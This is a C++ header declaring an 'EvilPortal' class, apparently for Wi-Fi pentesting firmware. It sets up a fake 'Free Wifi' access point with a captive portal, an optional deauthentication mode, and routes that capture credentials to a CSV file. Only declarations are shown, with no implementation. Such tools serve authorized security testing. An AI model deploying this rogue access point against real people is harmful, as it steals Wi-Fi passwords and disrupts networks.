#ifndef EVIL_PORTAL_H
#define EVIL_PORTAL_H

#include <DNSServer.h>
#include <WebServer.h>
#include "core/globals.h"


class EvilPortal {
public:
    /////////////////////////////////////////////////////////////////////////////////////
    // Constructor
    /////////////////////////////////////////////////////////////////////////////////////
    EvilPortal(String tssid = "", uint8_t channel = 6, bool deauth = false);
    ~EvilPortal();

    /////////////////////////////////////////////////////////////////////////////////////
    // Operations
    /////////////////////////////////////////////////////////////////////////////////////
    bool setup(void);
    void beginAP(void);
    void setupRoutes(void);
    void loop(void);

private:
    WebServer webServer;
    DNSServer dnsServer;
    IPAddress apGateway;

    uint8_t _channel;
    bool _deauth;

    String apName = "Free Wifi";
    String outputFile = "default_creds.csv";
    String htmlPage;
    String htmlFileName;
    bool isDefaultHtml = true;
    FS *fsHtmlFile;

    String lastCred;
    int totalCapturedCredentials = 0;
    int previousTotalCapturedCredentials = -1;
    String capturedCredentialsHtml = "";

    void portalController(void);
    void credsController(void);

    void loadCustomHtml(void);
    void loadDefaultHtml(void);
    String wifiLoadPage(void);
    void saveToCSV(const String &csvLine);

    void drawScreen(bool holdDeauth);

    String getHtmlTemplate(String body);
    String creds_GET(void);
    String ssid_GET(void);
    String ssid_POST(void);
};

#endif // EVIL_PORTAL_H


